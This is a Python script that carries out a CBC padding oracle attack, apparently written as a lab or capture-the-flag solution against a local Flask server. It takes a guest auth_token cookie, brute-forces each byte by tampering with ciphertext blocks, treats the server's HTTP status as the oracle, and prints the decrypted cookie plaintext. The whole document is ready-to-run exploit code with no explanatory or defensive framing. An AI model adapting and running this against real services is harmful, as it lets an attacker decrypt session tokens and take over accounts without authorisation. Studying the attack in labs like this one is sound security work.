# padding_oracle_attack.py
# Works against the provided Flask server (/profile oracle)

import base64
import requests

URL = "http://localhost:8080/profile"
BLOCK_SIZE = 16

def oracle(cookie_b64: str) -> bool:
    r = requests.get(
        URL,
        cookies={"auth_token": cookie_b64},
        timeout=5
    )
    return r.status_code == 200

def split_blocks(data, size=16):
    return [data[i:i+size] for i in range(0, len(data), size)]

def attack(cookie_b64):
    raw = base64.b64decode(cookie_b64)
    blocks = split_blocks(raw, BLOCK_SIZE)

    recovered = b""

    # work block by block (skip IV block at index 0)
    for bi in range(1, len(blocks)):
        prev = bytearray(blocks[bi-1])
        curr = blocks[bi]

        intermediate = [0] * BLOCK_SIZE
        plaintext_block = [0] * BLOCK_SIZE

        for pad_len in range(1, BLOCK_SIZE + 1):
            idx = BLOCK_SIZE - pad_len

            # fix already known bytes
            for j in range(idx + 1, BLOCK_SIZE):
                prev[j] = intermediate[j] ^ pad_len

            found = False
            for guess in range(256):
                prev[idx] = guess
                test = b"".join(blocks[:bi-1] + [bytes(prev), curr])
                test_b64 = base64.b64encode(test).decode()

                if oracle(test_b64):
                    intermediate[idx] = guess ^ pad_len
                    plaintext_block[idx] = intermediate[idx] ^ blocks[bi-1][idx]
                    found = True
                    break

            if not found:
                raise Exception("Byte not found")

        recovered += bytes(plaintext_block)

    return recovered

if __name__ == "__main__":
    # first get a valid cookie from /login?user=guest
    s = requests.Session()
    s.get("http://localhost:8080/login?user=guest")
    cookie = s.cookies.get("auth_token")

    if cookie is None:
        print("Error: Failed to retrieve auth_token cookie")
        exit(1)

    plaintext = attack(cookie)
    print("Recovered plaintext (raw):", plaintext)
    print("Recovered plaintext (utf-8):", plaintext.rstrip(plaintext[-1:]).decode())
